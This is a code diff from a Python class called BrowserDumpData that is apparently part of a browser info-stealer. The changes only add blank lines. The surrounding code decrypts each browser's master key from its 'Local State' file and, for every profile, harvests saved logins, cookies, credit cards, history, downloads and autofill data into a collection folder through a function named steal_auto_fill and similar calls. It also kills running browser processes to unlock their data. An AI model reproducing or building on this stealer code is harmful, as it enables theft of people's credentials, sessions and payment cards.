@@ -46,11 +46,15 @@ class BrowserDumpData:
                 continue
 
             local_state: str = f'{value['path_data']}\\Local State'
+
             if not os.path.exists(local_state):
                 continue
+
+
             # print(value['key_name'])
             master_key_class: object = GetMasterKey(local_state, value['key_name'])
             masterKey: bytes = master_key_class.get_master_key()
+
             if not masterKey:
                 continue
            
@@ -67,14 +71,20 @@ class BrowserDumpData:
                 profilePath: str = os.path.join(value['path_data'], profile)
                 if not os.path.exists(profilePath):
                     continue
+
                 self.runAllFunctions(profilePath, masterKey, self.king_folder_, browser_name, profile)
                 
     def runAllFunctions(self, profilePath, masterKey: bytes, kingFolder: str, browserName: str, profile):
         get_login_data(profilePath, masterKey, self.king_folder, browserName, profile)
+
         get_cookies(profilePath, masterKey, kingFolder, browserName)
+
         get_credit_cards(profilePath, masterKey, kingFolder)
+
         get_web_history(profilePath, kingFolder)
+
         get_downloads(profilePath, kingFolder)
+
         steal_auto_fill(profilePath, kingFolder, browserName)
 
     def close_browser_processes(self) -> None:
@@ -85,9 +95,13 @@ class BrowserDumpData:
         ]
         
         try:
+
             for proc in psutil.process_iter(attrs=['pid', 'name']):
+
                 if proc.info['name'] in browsers_to_close:
+
                     proc.kill()
+
         except Exception as err:
             print(err)
 
